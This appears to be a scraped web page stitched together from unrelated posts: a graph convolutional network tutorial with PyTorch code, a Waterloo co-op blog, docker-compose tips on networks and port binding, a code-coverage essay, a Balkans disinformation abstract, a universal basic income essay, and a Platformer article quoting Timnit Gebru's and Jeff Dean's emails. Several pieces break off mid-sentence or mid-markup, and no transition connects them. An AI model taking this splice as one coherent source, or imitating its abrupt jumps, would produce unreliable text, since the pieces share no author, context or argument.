<p>To recap, in this section we described a basic idea of generating node embeddings by aggregating neighborhood information.&nbsp;</p>



<p>Next, I’ll discuss Graph Convolutional Networks (GCNs).</p>






<h2 id="GCN">Graph Convolutional Networks</h2>



<p>GCNs were first introduced in “Spectral Networks and Deep Locally Connected Networks on Graphs” (Bruna et al, 2014), as a method for applying neural networks to graph-structured data.</p>



<p>The simplest GCN has only three different operators:</p>



<ul><li>Graph convolution</li><li>Linear layer</li><li>Nonlinear activation</li></ul>



<p>The operations are usually done in this order. Together, they make up one network layer. We can combine one or more layers to form a complete GCN.</p>



<p>In Python, we can easily build a GCN using PyTorch:</p>



<pre><span>import</span> torch
<span>from</span> torch <span>import</span> nn

<span><span>class</span> <span>GCN</span><span>(nn.Module)</span>:</span>
    <span><span>def</span> <span>__init__</span><span>(self, *sizes)</span>:</span>
        super().__init__()
        self.layers = nn.ModuleList([
            nn.Linear(x, y) <span>for</span> x, y <span>in</span> zip(sizes[:<span>-1</span>], sizes[<span>1</span>:])
        ])
    <span><span>def</span> <span>forward</span><span>(self, vertices, edges)</span>:</span>
        
        
        adj = torch.eye(len(vertices))
        
        adj[edges[:, <span>0</span>], edges[:, <span>1</span>]] = <span>1</span> 
        adj[edges[:, <span>1</span>], edges[:, <span>0</span>]] = <span>1</span>
        
        
        <span>for</span> layer <span>in</span> self.layers:
            vertices = torch.sigmoid(layer(adj @ vertices))
 
        <span>return</span> vertices</pre>






<h3><strong>GraphSAGE idea</strong></h3>



<p>GraphSAGE (Hamilton et al, NIPS 2017) is a representation learning technique for dynamic graphs.&nbsp;</p>



<p>It can predict the embedding of a new node, without needing a re-training procedure.&nbsp;</p>



<p>To do this, GraphSAGE uses inductive learning. It learns aggregator functions which can induce new node embedding, based on the features and neighborhood of the node.</p>

                <p>If you work in Silicon Valley, you’ve probably heard of The University of Waterloo (UW). And if you haven’t, the easiest way to explain it is that Waterloo is Canada’s answer to Stanford.</p><p>Located in Canada’s burgeoning tech hub, Kitchener-Waterloo, Waterloo has become famous for two things: its comprehensive STEM programs, and the increasing number of alums who are making a name for themselves in tech.</p><p>In an ecosystem full of famous drop-outs, when a university is able to compete in Silicon Valley, it stands out. As a Waterloo student myself, here’s why I think they’ve been able to.</p><figure><img src="https://blog.arctype.com/content/images/2020/12/uw.jpg" alt="" srcset="https://blog.arctype.com/content/images/size/w600/2020/12/uw.jpg 600w, https://blog.arctype.com/content/images/2020/12/uw.jpg 800w" sizes="(min-width: 720px) 720px"></figure><h2 id="the-co-op-program-or-what-makes-uw-s-stem-programs-different-"><strong>The co-op program, or what makes UW’s STEM programs different. </strong></h2><p>One of the most frequent criticisms about college you’ll hear in Silicon Valley is that it doesn’t give you as robust of a tech education as real life work experience does. The idea is that anything you learn in a classroom you could learn out in the field, and usually, not only better, but at no cost to you. &nbsp;</p><p>Waterloo’s Cooperative Education program, also known as the co-op program, solves for this issue. </p><p>At Waterloo, students can choose to alternate between academic terms and paid work. If they take advantage of this opportunity, they can graduate with up to two years of work experience. By contrast, in the United States, it’s a difficult dance between work and school—you’re often left with the choice of staying in college, or dropping out to pursue work.</p><p>The benefits of the co-op program extend beyond the hands-on learning experience, too.</p><ol><li>Students who participate in the co-op program can earn an average of $80,500 over their working semester. This gives students the opportunity, regardless of their socioeconomic status coming into school, to graduate with little or no debt.</li><li>Waterloo also has a phenomenal alumni network, with people like Chamath Palihapitiya, Vitalik Buterin, and David Cheriton among the list of notable graduates. Many of them return to join the pool of employers, creating a network that many students have access to before they even graduate.<p>The city of Waterloo has the highest start-up density in North America, only second to the San Francisco Bay Area. With entrepreneurship accelerators and incubators like Velocity and the Accelerator Centre, early-stage startups within the Waterloo region have created over 7,500 jobs, and generated $2.3 billion in revenue in a decade.</p></li></ol><h2 id="a-little-more-on-the-benefits-of-graduating-without-debt-"><strong>A little more on the benefits of graduating without debt.</strong></h2><p>Between the lower cost of Canadian education, and the opportunity to start earning an income while still in school, very few Waterloo students end up worrying about debt.</p><p>This detail might seem like a footnote, icing on the cake of an otherwise nurturing academic environment, but it’s a nontrivial component to why Waterloo students are succeeding. They simply have the freedom to.</p><p>Starting a business, working at a former classmate’s start-up, or really, taking any entrepreneurial risk at all, is much less of a gamble when you don’t have to worry about making your student loan payments on time. Having the freedom to experiment is invaluable, especially if you also have a strong foundation of technical skills.</p><h2 id="a-self-reinforcing-cycle-"><strong>A self-reinforcing cycle.</strong></h2><div><p>Waterloo has managed to strike the perfect balance. Students are able to build complex technical skills with institutional support while still fostering an entrepreneurial spirit, both of which are essential for innovation. With alum that have gone on to found companies like PagerDuty, Instacart, and Wish Shopping, it’s clear we’re doing something right.</p><p>Maybe the question Silicon Valley is asking shouldn’t be “to stay in school or to drop out,” but instead, “How can we make schools more amenable to technical innovation?” </p></div><p>Waterloo might just have an answer. </p><hr><p>This fall, I have been working as a Product Management intern at Arctype.

                    <p>Tell me if this sounds familiar? You were introduced to docker-compose either by choice or by force. You’ve been using it for a while, but you find it clunky. I’m here to tell you, you are probably using it wrong.</p><p>Ok, that might be an exaggeration. I don’t think there’s actually a 100% right or wrong way to use it: home-grown build and dev setups tend to have all kinds of weird requirements and so the standard doesn’t always match the needs. Please take the article with the appropriate skepticism if your situation doesn’t quite fit.</p><p>I, myself, have been guilty of each of these in the past and I might be in the future as well!!</p><p>In any case, here is a rundown of some of the cardinal sins that I found myself making while using docker-compose.</p><p>In this article, I’ll be focusing on use-cases related to <strong>integration testing</strong> and using docker-compose as a <strong>development environment</strong>. For production use, I think docker-compose is usually ill-suited.</p><h2 id="problem-1-you-re-using-the-host-network">Problem #1: You’re using the host network</h2><p>One of the first things new-comers find cumbersome is the use of Docker networks. It’s yet another layer of knowledge to add to your repertoire after you get used to the basics of <strong>docker build</strong> and <strong>docker run</strong>… and frankly, why do you even need to understand these Docker networks? Everything works fine via the host network, right? Wrong!</p><p>Using the host network means that you have to reserve specific ports for the various microservices that you use. If you happen to bring up two stacks that collide on ports, tough luck. If you want to bring up two versions of the same stack, tough luck. You want to test the behavior of a certain service when it has multiple replicas? Tough... luck!<br></p><p>By default, docker-compose spins up its containers on a separate network called <strong>&lt;project-name&gt;_default</strong> (where <strong>&lt;project-name&gt;</strong> is by default the name of the directory). So really, you don’t need to do anything special in order to take advantage of Docker networks.</p><p>This network gives you a number of benefits right off the bat:</p><ul><li>It’s a network more isolated from your host network - so it’s less likely that the specifics of your system environment will cause the compose setup to behave differently. You have access to the internet, but any ports that you wish to be accessible from the host need to be declared with a port bind.</li><li>If a service starts listening on 0.0.0.0 (the way containers should), then a host network setup will open up that port on your WLAN. If you use a Docker network, it’ll only expose that port to that network.</li><li>You can talk between services by using their compose names as host names. So if you have a service called <strong>db</strong> and within it there’s a service listening on port <strong>5432</strong>, then you can access it from any other service via <strong>db:5432</strong>. This is typically more intuitive than <strong>localhost:5432</strong>. And because there is no risk of localhost port clashing, it has a greater chance to be more consistent when used across different projects.</li><li>Most ports don’t need to be opened up to the host too - which means that they are not competing on global resources, should you need to increase the replication via <a href="https://docs.docker.com/compose/reference/up/"><strong>--scale</strong></a>.</li></ul><h2 id="problem-2-you-re-binding-ports-on-the-host-s-0-0-0-0">Problem #2: You’re binding ports on the host’s 0.0.0.0</h2><p>I’ve seen it everywhere, you’ve seen it everywhere, everybody saw it everywhere: binding ports as <strong>8080:8080</strong>. At first glance, this looks innocuous. But the devil is in the details. This extremely common port bind is not just forwarding a container port to the localhost - it forwards it to be accessible on every network interface on your system - including whatever you use to connect to the internet.</p><p>This means that it’s very likely that your development containers are constantly listening on your WLAN - when you’re home, when you’re in the office, or when you’re at McDonald’s. It’s always accessible. This can be dangerous. Don’t do that.</p><p>“But Vlad, I use <strong>ufw</strong>, my ports aren’t accessible by default”.</p><p>That may be true - but if you use this docker-compose setup as a team, one of your teammates might not have a firewall on their laptop.</p><p>The fix is very easy: Just add <strong>127.0.0.1:</strong> in front. So for example <strong>127.0.0.1:8080:8080</strong>. This simply tells docker to only expose the port to the loopback network interface and nothing else.</p><h2 id="problem-3-you-re-using-sleep-to-coordinate-service-startup">Problem #3: You’re using sleep to coordinate service startup</h2><p>I have a confession to make. I’m 100% guilty of this.</p><p>The main reason this is such a complicated issue is that there is no support from Docker or Docker Compose to address this. Version 2.1 of the docker-compose format used to have a <strong>depends_on</strong> option called <strong>condition</strong> which could be set to <strong>service_healthy</strong>. And also, each service could have a <strong>healthcheck</strong> command which could tell docker-compose what “healthy” means. Well, this is <a href="https://docs.docker.com/compose/compose-file/#depends_on">no longer available in Version 3.0</a> and <a href="https://stackoverflow.com/questions/47710767/what-is-the-alternative-to-condition-form-of-depends-on-in-docker-compose-versio">no replacement</a> is offered for it.</p><p>Docker’s docs basically <a href="https://docs.docker.com/compose/startup-order/">recommend</a> that your service is made resilient to other services not being around for a while because that’s what might happen in production anyway, if there’s a short network bleep, or if a service restarts. Can’t argue with that logic.</p><p>Where it gets a bit more cumbersome is when you run an integration test and the routines meant for initializing the test environment (eg pre-populating the database with some test data) end up not being resilient to starting before the other service is ready. So the argument about “it should be resilient in production anyway” doesn’t quite apply here, because the code to populate the DB with test data is never used in production.</p><p>For such cases, you need something that waits for services to be ready. Docker recommends using <a href="https://github.com/vishnubob/wait-for-it">wait-for-it</a>, <a href="https://github.com/jwilder/dockerize">Dockerize</a> or <a href="https://github.com/Eficode/wait-for">wait-for</a>. Note, however, that a port being ready isn’t always a sign that the service is ready to be used. For example, in an integration test using a certain SQL DB with a certain schema, the port becomes available when the DB is initialized, however, the test might only work after a certain schema migration has been applied. You may need application-specific checks on top.</p><h2 id="problem-4-you-re-running-the-db-in-docker-compose-but-the-test-on-the-host">Problem #4: You’re running the DB in docker-compose, but the test on the host</h2><p>Here is a situation: you want to run some unit tests but those tests depend on some external services. Maybe a database, maybe a Redis, maybe another API. Easy: let’s put those dependencies in a docker-compose and have the unit test connect to those.</p><p>That’s great - but note that your tests aren’t exactly just unit tests anymore. They are now integration tests. Besides the nomenclature, there is an important distinction to take into account now: you’ll need to account for a setup of the test environment and a teardown. Usually, it’s best for the setup/teardown to be performed outside of the test code - main reason being that there may be multiple distinct packages depending on these external services. But YMMV.</p><p>If you do end up separating test setup and teardown, you could go the extra mile and containerize your integration test. Hear me out!</p><p>Containerized tests mean:</p><ul><li>You are on the same Docker network, so the connectivity setup is the same you would use for running your service in compose anyway. Configuration becomes cleaner.</li><li>You may be able to reuse the code used to wait for other services to be ready in your setup/teardown.</li><li>The integration test does not depend on any other local system configuration or environment setup, such as say… your JFrog credentials, or any build dependencies. A container is isolated.</li><li>If another team needs to run your tests against an updated version of a service the tests depend on, you can just share the integration testing image - no need for them to compile or to setup a build toolchain.</li><li>If you end up with multiple separate integration test containers, you can typically run all of them at the same time in parallel.</li></ul><p>A tip for using containerized integration tests is to use a separate docker-compose definition for them. For example, if most of your services exist in <strong>docker-compose.yml</strong>, you could add <strong>docker-compose.test.yml</strong> with integration test definitions. This means that <strong>docker-compose up</strong> brings up your usual services, while <strong>docker-compose -f docker-compose.yml -f docker-compose.test.yml up</strong> starts your integration tests. For a full example on how to achieve this, see this excellent <a href="https://github.com/george-e-shaw-iv/integration-tests-example">docker-compose integration testing</a> repository from Ardan Labs.</p><p>Ok, ok - calling this out as being wrong isn’t entirely fair. There are many situations where not containerizing is preferable. As a simple example, many languages have deep IDE integrations which make inserting a container between the language and the IDE pretty much impossible. There are many valid productivity reasons not to do this.</p><h2 id="conclusion">Conclusion</h2><p>Docker Compose can be an amazing tool for local development purposes. Although it has a few gotchas, it usually brings a lot of productivity benefits to many engineering teams, especially when used in conjunction with integration tests.</p><p>If you’re looking for more flexibility in defining containerized tests than docker-compose alone can provide, take a <a href="https://github.com/earthly/earthly/blob/0f48f14/examples/integration-test/Earthfile#L38-L44">look</a> at <a href="https://docs.earthly.dev/guides/integration">integration test support</a> in <a href="https://earthly.dev/">Earthly</a>.</p>

<div id="post-body"><p>One question I often ask potential software engineering candidates is to pinpoint the percentage of code coverage in an ideal project. Interestingly enough, many of them jump to the sky with numbers beyond 90%. They would start preaching how well-tested code is more reliable and brings more value to all stakeholders. When I ask about the current projects they work on, the reality looks a bit more down to earth.</p><p>Want to know my answer? I'd say it's <strong>around 66.7%</strong>.</p><p>The reasons for that vary, but allow me to be blunt and say that <strong>1/3 of the code every software project is irrelevant, buggy, overly complicated, or simply sucks.</strong> It has a reason to be where it is, but chances are, one year down the road, it will become a liability. Being dogmatic about tests and covering every line will only make it more difficult to get rid of it.</p><p>See, no two lines of code are equal in value and importance. Adding a new feature to an existing application affects its capabilities only marginally. However, it takes a proportionally large amount of time to develop and integrate due to the existing complexity. The bigger the complexity, the longer it takes to introduce new functionality. By the time the feature finds itself in production, it may as well be already irrelevant.</p><blockquote>The only sure-fire way to improve code coverage (and by that keep software relevant) is to identify and remove the unnecessary code.</blockquote><p>How do you identify irrelevant code? Don't search for it. Instead, let it reveal itself to you. One dimension of software that few teams make good use of, is its history. Git is a great analysis tool. Start using it not only to prevent future problems but also, to understand where and how often certain parts of the code change over time.</p><p>Chances are, you will find pieces of code that have undergone fewer changes than the rest in long periods. Those are the pillars of your application - the 2/3s that <strong>must be well-tested</strong>.</p><p>You will also find others where changes occur more or less every week. Ask yourselves whether those are still relevant, both from a technical and business perspective. Adding tests for the sake of coverage would have the opposite effect of increasing the code quality. In a perfectly-design software project, the part that is allowed to change most often is the configuration. A simple analysis of the code change frequency would show whether that is the case. If it isn't, try separating the moving parts from the core logic. If this is not feasible either, most probably those portions of the code don't belong to the codebase anyway. Turning them into interchangeable scripts (even stored in a separate repository) is one way of tackling them in their own right.</p><p>Let's not get too much into technical details. I have already alluded to the work of <a href="https://twitter.com/AdamTornhill">Adam Tornhill</a> on code analysis in a previous post of mine:</p><figure><a href="https://preslav.me/2020/03/01/use-the-git-history/"><div><p>Use the Git History to Identify Pain Points in Any Project</p><p>Have you heard of Adam Tornhill [https://twitter.com/AdamTornhill]’s work?

					Mapping Fake News and Disinformation in the Western Balkans and Identifying Ways to Effectively Counter Them
				</h3>
				<p><span>03-12-2020</span></p>
				
					
					
						<p>Disinformation is an endemic and ubiquitous part of politics throughout the Western Balkans, without exception. A mapping of the disinformation and counter-disinformation landscapes in the region in the period from 2018 through 2020 reveals three key disinformation challenges: external challenges to EU credibility; disinformation related to the COVID-19 pandemic; and the impact of disinformation on elections and referenda. While foreign actors feature prominently – chiefly Russia, but also China, Turkey, and other countries in and near the region – the bulk of disinformation in the Western Balkans is produced and disseminated by domestic actors for domestic purposes. Further, disinformation (and information disorder more broadly) is a symptom of social and political disorder, rather than the cause. As a result, the European Union should focus on the role that it can play in bolstering the quality of democracy and governance in the Western Balkans, as the most powerful potential bulwark against disinformation.</p>

            <p><strong>Dec 3, 2020</strong></p>
            
            

<p>Universal basic income (UBI) is an odd duck. Proponents range from futurists to libertarians to social democrats. Why this weird range of people?</p>

<p>There are different versions of UBI, with different motivations. People don’t get how <em>contradictory</em> these are. Libertarians and social democrats might both support a fuzzy idea of “UBI” but they’d never agree on specifics.</p>

<p>I don’t think it matters though. I’m deeply skeptical of these <em>interesting</em> versions of UBI. The only realistic option is another, <em>boring</em> version. Why isn’t it discussed more? The more you think about it, the more of a riddle that is.</p>



<p>A libertarian argument for Universal Basic Income might go something like this:</p>

<blockquote>
  <p>The government is stupid and inefficient. There’s medicare, medicaid, social security, food stamps, “other food stamps” (WIC), welfare, “other welfare” (SSI), and unemployment benefits, each with a bureaucracy. Did you know that each item in a supermarket has been classified as buyable with food stamps or not? (<a href="https://ask.usda.gov/s/article/Are-energy-drinks-eligible-for-purchase-with-Supplemental-Nutrition-Assistance-Program-benefits">Energy drinks are usually OK</a>, <a href="https://www.fns.usda.gov/snap/facts">toothpaste is not</a>.) And there’s a <em>different</em> classification for the “other” food stamps? (No <a href="https://www.fns.usda.gov/wic/wic-food-packages-regulatory-requirements-wic-eligible-foods">spices or drinkable yogurt</a>.) And that if you lose your job you need to provide evidence each month that you spent 80 hours looking for a new one? These expensive programs are often miserable for the people they’re supposed to help. Let’s stop micromanaging people’s lives, cut the fat, and <strong>just give people money</strong>?</p>
</blockquote>

<p>I see the appeal, and if you want to reorganize cash transfers like social security and call them “UBI”, that’s fine with me! But it’s very unlikely UBI can replace medicaid.</p>

<p>To see why, consider schools. Sometimes the government runs them. Sometimes the government merely pays for privately run “charter” schools. Sometimes the government pays for “vouchers” that subsidize a fraction of expensive private school.</p>

<p>Why do things this way? Why not give parents (or kids!?) the money and let them spend it however they want?</p>

<p>The answer is obvious, even if we don’t usually say it explicitly: We don’t trust people and we want to control them. Educating kids is an investment that benefits everyone in the future. If we just gave parents cash, I’m sure many would arrange for a better education than the government does now. But I’m also sure many would spend it on wacky religions schools, or crystal healing seminars, or beer.</p>

<p>To be clear, no real UBI proposals would change funding for schools! But that’s kind of the point. That this is <em>so obviously</em> a bad idea shows two things:</p>

<ol>
  <li>
    <p>It’s sometimes valid to constrain how money is used. We can’t “just give people money” without looking at the details. The question is <em>how much</em> to control to assert in each case.</p>
  </li>
  <li>
    <p>Control isn’t free. Some kids might do better in larger classes with higher-paid teachers. Some might prefer individual tutoring and peer instruction. Some might learn to read at home but need more instruction on math. If parents had flexibility, they could probably use the money more effectively. Restrictions to prevent worst-case outcomes also prevent these gains.</p>
  </li>
</ol>

<p>Again, schools are just a hypothetical. What’s not hypothetical is <em>healthcare</em>. For example, <a href="https://www.wsj.com/articles/a-guaranteed-income-for-every-american-1464969586">Charles Murray</a> suggests rolling all government entitlements and healthcare expenditures together into a grant of $12,000, with no tax increase.</p>

<p>This would never work. Say we stop subsidizing healthcare and just give people money. No matter what you do, some won’t save and won’t buy health insurance. (If you doubt this, you’ve met a different species than I have.) Then, you have this difficult question: When one of these people gets sick and shows up at a hospital, do you let them die?</p>

<p>Intellectually, this is a question I take seriously. Think about it like this: Suppose you can choose to be born into Safeland where everyone is secure but bored, or Dangerland where people have fun but risk getting killed. It’s totally reasonable for someone to choose Dangerland. A tough-love “buy insurance or risk death” policy allows people to optimize for their own <a href="https://dyno-might.github.io/2020/10/19/its-hard-to-use-utility-maximization-to-justify-creating-new-sentient-beings/">utility function</a>.</p>

<p><em>Practically</em>, though, there is no question. Society has decided: It’s not acceptable to let people die, and we need some kind of emergency backstop program. But now we’ve gotten back into the healthcare subsidy business. We’ve also abandoned <em>just giving people money</em>, since any funding for the backstop could have been an unrestricted grant.</p>

<p>To avoid this problem, Murray suggests that $3000 of the $12,000 must be spent on health insurance. This is a compromise on the dream of <em>just giving people money</em>. It also reduces, but doesn’t eliminate the underlying problem. What if people need a treatment that wasn’t included in their insurance? Do you have “death panels” to decide what “essential” procedures need to be included? What happens if these can’t be offered for $3000? (The average person in the US uses <a href="https://www.cms.gov/Research-Statistics-Data-and-Systems/Statistics-Trends-and-Reports/NationalHealthExpendData/NHE-Fact-Sheet">$11,000</a> worth of healthcare.)</p>

<p>If you want to do UBI, it mostly has to come <em>on top</em> of targeted programs. That’s <em>increasing</em> the scope of government, not decreasing it. That might be a good idea, but it’s <em>not</em> the libertarian dream. If that’s what you want, you need a different argument.</p>



<p>Here’s a different argument for basic income.</p>

<blockquote>
  <p>Artificial intelligence is coming, and jobs going extinct. Without action, soon all income will go to the wealthy or to the rare people who work on robots/AIs. But jobs getting automated should be good news! There will be plenty of money. In a sane world, when an AI replaces a truck driver, we’d keep paying them without asking them to come to work. For all of history, people have spent their lives mostly scrambling to survive. It’s time for us to be liberated, to spend our time on art, science, politics, whatever. Let the human spirit soar.”</p>
</blockquote>

<p>I have three responses to this.</p>

<p><strong>First</strong>, there isn’t plenty of money, yet. Giving 256 million adults the average truck driver salary of $67 thousand per year would cost $17 trillion. For reference, that’s 4 times the entire <a href="https://www.cbo.gov/system/files/2020-04/56324-CBO-2019-budget-infographic.pdf">current federal budget</a>:</p>

<p><img src="https://dyno-might.github.io/img/skeptical_ubi/budget_small.png" alt="budget"></p>

<p>It’s almost as large as the entire <em>economy</em> ($21 trillion). Giving everyone $12k per year would cost $3 trillion. That’s more than all benefit programs combined, but not impossible. Suppose we make some difficult cuts, add some new taxes and make it happen. Do we expect anyone who previously had a good job to be content with $12 thousand? I’m sure it’s <em>helpful</em>, but it’s no <em>substitute</em> for a job.</p>

<p><strong>Second</strong>, this isn’t how economic revolutions worked in the past. Everyone knows the story: We moved from farms to manufacturing and services as each sector got automated. Keynes famously predicted 90 years ago that we would soon only need to work 15 hours a week. Why didn’t that happen? He was right that existing jobs would mostly disappear. What he missed was that we’d invent so much new stuff and then decide we couldn’t live without it. Are we <em>really sure</em> this time is different? A counter-response from a UBI fan would be that “every trend continues until it stops”. Previously, there were obvious productive things for people to shift their effort to. Now, that’s not clear. My counter counter-reply is: Are you <em>sure</em>?</p>

<p>Both of these responses boil down to “your argument for UBI is premised on some future that’s not here yet”. If 30 years from now the economy is 50x bigger and all the jobs are gone, these responses are moot.</p>

<p>A <strong>third</strong> response is that this argument for UBI assumes jobs are all about money. Joe and Jill Biden are worth around $10 million. So why is Jill Biden teaching English at Northern Virginia Community College? People get much of their identity and meaning in life from their jobs. We are sort of like border collies: Without a role to play, we go crazy. Most people don’t want a handout, they want to feel that they’ve <em>earned</em> what they have.</p>

<p>To be sure, <em>some</em> people, if their current job was replaced with a UBI, would devote themselves to other passions. (Can anyone doubt that a million rationalist-adjacent blogs would bloom?) But others would get bored and depressed. Don’t believe me? Check out fire Financial Independence / Early Retirement (FIRE) forums. There are tons of people who worked hard, saved money, and retired young. They find that relaxation and “fun” get old quickly. Some people occupy themselves volunteer work or creative projects. For others this doesn’t work and they spiral into depression until they eventually decide to take another job.</p>

<p>Maybe society shouldn’t be like this. I don’t really <em>like</em> this connection between work and value. Maybe social norms just need to adjust. Maybe FIRE folks would love retirement if their friends were also free to hang out in the middle of the day. Perhaps, but I think we also need to prepare for the possibility that this doesn’t work.</p>

<p>Here, a UBI proponent might object. “Well, look! Suppose this jobless world comes as predicted. What then? At least I’m proposing a solution! All you’re doing is claiming the solution won’t work. What would you actually suggest we do? Keeping the current world is not an option.”</p>

<p>I agree. We don’t have a stop button to stop the world shifting under our feet. If jobs really do go obsolete, we’ll have to figure something out. I’d support experimenting with UBI. But I’d suggest we <em>also</em> experimenting with how to make jobs stick around. It’s easy to open a building downtown with a “fake jobs for insecure people” sign, but this probably wouldn’t work. We’d probably need to really believe our jobs are valuable.</p>

<p>(As an aside: How to create jobs that look useful? In a future where AI is so powerful that normal human jobs are gone, shouldn’t we be worried about AI risk? Can we create bottlenecks in processes that have to be filled by humans? How to do this in a way that <em>actually</em> reduces AI risk is a hard problem. For our purposes, all that matters is it seems plausible.)</p>

<p><em>Is</em> the world changing under our feet, though? <em>Are</em> jobs …</p></div></div></div></div></section></div>

If this work is meaningful to you, I invite you to become a subscriber today</em>.</p><p>Last week, a prominent a co-leader of the Ethical Artificial Intelligence team at Google sent an email to her colleagues. Timnit Gebru had been working on a research paper that she hoped to publish, but ran into resistance from her superiors at Google. And so she sent a letter expressing her frustration to the internal listserv Google Brain Women and Allies. </p><p>A few days later, Gebru was fired —&nbsp;Google reportedly found the email “inconsistent with the expectations of a Google manager.” It details the struggles Gebru experienced as a Black leader working on ethics research within the company, and presents a bleak view of the path forward for underrepresented minorities at the company. </p><p>Gebru is well known and respected in the AI ethics community; <a href="https://www.bloomberg.com/news/articles/2020-12-03/google-s-co-head-of-ethical-ai-says-she-was-fired-over-email?sref=ExbtjcSG">here are Shelly Banjo  and Mark Bergen on her background at Bloomberg</a>:</p><blockquote><p>Gebru, an alumni of the Stanford Artificial Intelligence Laboratory, is one of the leading voices in the ethical use of artificial intelligence. She is well-known for her work on a&nbsp;<a href="https://news.mit.edu/2018/study-finds-gender-skin-type-bias-artificial-intelligence-systems-0212" title="MIT">landmark study</a>&nbsp;in 2018 that showed how facial recognition software misidentified dark-skinned women as much as 35% of the time, whereas the technology worked with near precision on white men.</p><p>She has also been an outspoken critic of the lack of diversity and unequal treatment of Black workers at tech companies, particularly at&nbsp;<a href="https://www.bloomberg.com/quote/GOOGL:US" title="Company Overview">Alphabet Inc.</a>’s Google, and said she believed her dismissal was meant to send a message to the rest of Google’s employees not to speak up.</p></blockquote><p>Platformer received the email Gebru sent; she herself did not have access to her account after Google terminated her. It is published in full below. </p><p>Google did not immediately respond to a request for comment. But on Thursday morning, Jeff Dean, the head of Google research, emailed employees with his account of what happened. Dean said Gebru had issued ultimatum and would resign unless certain conditions were met. <strong>Platformer</strong> obtained Dean’s email as well; you can find it below Gebru’s. </p><blockquote><p>Hi friends,</p><p>I had stopped writing here as you may know, after all the micro and macro aggressions and harassments I received after posting my stories here (and then of course it started being moderated).</p><p>Recently however, I was contributing to a document that Katherine and Daphne were writing where they were dismayed by the fact that after all this talk, this org seems to have hired 14% or so women this year. Samy has hired 39% from what I understand but he has zero incentive to do this.</p><p>What I want to say is stop writing your documents because it doesn’t make a difference. The DEI OKRs that we don’t know where they come from (and are never met anyways), the random discussions, the “we need more mentorship” rather than “we need to stop the toxic environments that hinder us from progressing” the constant fighting and education at your cost, they don’t matter. Because there is zero accountability. There is no incentive to hire 39% women: your life gets worse when you start advocating for underrepresented people, you start making the other leaders upset when they don’t want to give you good ratings during calibration. There is no way more documents or more conversations will achieve anything. We just had a Black research all hands with such an emotional show of exasperation. Do you know what happened since? Silencing in the most fundamental way possible.</p><p>Have you ever heard of someone getting “feedback” on a paper through a privileged and confidential document to HR? Does that sound like a standard procedure to you or does it just happen to people like me who are constantly dehumanized?</p><p>Imagine this: You’ve sent a paper for feedback to 30+ researchers, you’re awaiting feedback from PR &amp; Policy who you gave a heads up before you even wrote the work saying “we’re thinking of doing this”, working on a revision plan figuring out how to address different feedback from people, haven’t heard from PR &amp; Policy besides them asking you for updates (in 2 months). A week before you go out on vacation, you see a meeting pop up at 4:30pm PST on your calendar (this popped up at around 2pm). No one would tell you what the meeting was about in advance. Then in that meeting your manager’s manager tells you “it has been decided” that you need to retract this paper by next week, Nov. 27, the week when almost everyone would be out (and a date which has nothing to do with the conference process). You are not worth having any conversations about this, since you are not someone whose humanity (let alone expertise recognized by journalists, governments, scientists, civic organizations such as the electronic frontiers foundation etc) is acknowledged or valued in this company.</p><p>Then, you ask for more information. What specific feedback exists? Who is it coming from? Why now? Why not before? Can you go back and forth with anyone? Can you understand what exactly is problematic and what can be changed?</p><p>And you are told after a while, that your manager can read you a privileged and confidential document and you’re not supposed to even know who contributed to this document, who wrote this feedback, what process was followed or anything. You write a detailed document discussing whatever pieces of feedback you can find, asking for questions and clarifications, and it is completely ignored. And you’re met with, once again, an order to retract the paper with no engagement whatsoever.</p><p>Then you try to engage in a conversation about how this is not acceptable and people start doing the opposite of any sort of self reflection—trying to find scapegoats to blame.</p><p>Silencing marginalized voices like this is the opposite of the NAUWU principles which we discussed. And doing this in the context of “responsible AI” adds so much salt to the wounds. I understand that the only things that mean anything at Google are levels, I’ve seen how my expertise has been completely dismissed. But now there’s an additional layer saying any privileged person can decide that they don’t want your paper out with zero conversation. So you’re blocked from adding your voice to the  research community—your work which you do on top of the other marginalization you face here. </p><p>I’m always amazed at how people can continue to do thing after thing like this and then turn around and ask me for some sort of extra DEI work or input. This happened to me last year. I was in the middle of a potential lawsuit for which Kat Herller and I hired feminist lawyers who threatened to sue Google (which is when they backed off--before that Google lawyers were prepared to throw us under the bus and our leaders were following as instructed) and the next day I get some random “impact award.” Pure gaslighting.</p><p>So if you would like to change things, I suggest focusing on leadership accountability and thinking through what types of pressures can also be applied from the outside. For instance, I believe that the Congressional Black Caucus is the entity that started forcing tech companies to report their diversity numbers. Writing more documents and saying things over and over again will tire you out but no one will listen.</p><p>Timnit </p></blockquote><p>And here is the email that Jeff Dean sent out to Googlers on Thursday morning.</p><blockquote><p>Hi everyone,</p><p>I’m sure many of you have seen that Timnit Gebru is no longer working at Google. This is a difficult moment, especially given the important research topics she was involved in, and how deeply we care about responsible AI research as an org and as a company.</p><p>Because there’s been a lot of speculation and misunderstanding on social media, I wanted to share more context about how this came to pass, and assure you we’re here to support you as you continue the research you’re all engaged in.</p><p>Timnit co-authored a paper with four fellow Googlers as well as some external collaborators that needed to go through our review process (as is the case with all externally submitted papers). We’ve approved dozens of papers that Timnit and/or the other Googlers have authored and then published, but as you know, papers often require changes during the internal review process (or are even deemed unsuitable for submission). Unfortunately, this particular paper was only shared with a day’s notice before its deadline — we require two weeks for this sort of review — and then instead of awaiting reviewer feedback, it was approved for submission and submitted.</p><p>A cross functional team then reviewed the paper as part of our regular process and the authors were informed that it didn’t meet our bar for publication and were given feedback about why. It ignored too much relevant research — for example, it talked about the environmental impact of large models, but disregarded subsequent research showing much greater efficiencies.&nbsp; Similarly, it raised concerns about bias in language models, but didn’t take into account recent research to mitigate these issues. We acknowledge that the authors were extremely disappointed with the decision that Megan and I ultimately made, especially as they’d already submitted the paper.&nbsp;</p><p>Timnit responded with an email requiring that a number of conditions be met in order for her to continue working at Google, including revealing the identities of every person who Megan and I had spoken to and consulted as part of the review of the paper and the exact feedback. Timnit wrote that if we didn’t meet these demands, she would leave Google and work on an end date. We accept and respect her decision to resign from Google.</p><p>Given Timnit's role as a respected researcher and a manager in our Ethical AI team, I feel badly that Timnit has gotten to a place where she feels this way about the work we’re doing. I also feel badly that hundreds of you received an email just this week from Timnit telling you to stop work on critical …</p></blockquote></div></div>

